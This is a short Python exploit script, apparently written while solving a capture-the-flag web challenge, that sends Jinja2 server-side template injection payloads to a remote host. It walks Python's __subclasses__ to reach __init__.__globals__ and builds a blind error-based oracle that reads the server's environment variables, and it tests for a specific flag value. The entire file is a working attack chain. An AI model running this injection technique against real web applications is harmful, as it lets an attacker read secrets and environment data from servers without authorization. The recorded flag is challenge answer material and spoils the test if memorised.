import re
import sys
import urllib.parse
import urllib.request

sys.stdout.reconfigure(encoding="utf-8")
BASE = "http://54jsekbkx1fmpdlr.neu-nex.fun"
SUB = "''.__class__.__mro__[1].__subclasses__()"


def fetch(name):
    u = BASE + "/?name=" + urllib.parse.quote(name)
    r = urllib.request.urlopen(urllib.request.Request(u, headers={"User-Agent": "Mozilla/5.0"}), timeout=10)
    b = r.read().decode("utf-8", "replace")
    m = re.search(r'(?s)<span class="output">(.*?)</span>', b)
    return m.group(1) if m else b[:150]


def oracle(cond):
    payload = ("{% for c in " + SUB + " %}{% if c.__name__=='_wrap_close' %}"
               "{% set G = c.__init__.__globals__ %}"
               "{% if " + cond + " %}{{ 1/0 }}{% endif %}"
               "{% endif %}{% endfor %}")
    r = fetch(payload)
    return {"渲染出错了!": True, "渲染出来不一样，我不会告诉你任何事情!": False}.get(r, r)


lines = []
for label, payload in [
    ("name=abc", "abc"),
    ("{{7*7}}", "{{7*7}}"),
    ("{{7*7", "{{7*7"),
    ("{{self}}", "{{self}}"),
    ("{{1/0}}", "{{1/0}}"),
    ("{{1/0 if 1==1 else 1}}", "{{1/0 if 1==1 else 1}}"),
    ("{{1/0 if 1==2 else 1}}", "{{1/0 if 1==2 else 1}}"),
]:
    lines.append("%-32s -> %s" % (label, fetch(payload)))

lines.append("oracle: '1==1' -> %s" % oracle("1 == 1"))
lines.append("oracle: '1==2' -> %s" % oracle("1 == 2"))
lines.append("oracle: \"'FLAG' in G['environ']\" -> %s" % oracle("'FLAG' in G['environ']"))
lines.append("oracle: \"FLAG length == 30\" -> %s" % oracle("(%s)|length == 30" % "G['environ']['FLAG']"))
lines.append("oracle: \"FLAG == nex{C0loR_Y0uR_N19Ht_knvmh44e}\" -> %s"
             % oracle("G['environ']['FLAG'] == 'nex{C0loR_Y0uR_N19Ht_knvmh44e}'"))

text = "\n".join(lines) + "\n"
print(text, end="")
open(r"<WORKSPACE>\rollout\web-kimi-no-kioku\evidence\step2_oracle.txt", "w", encoding="utf-8").write(text)
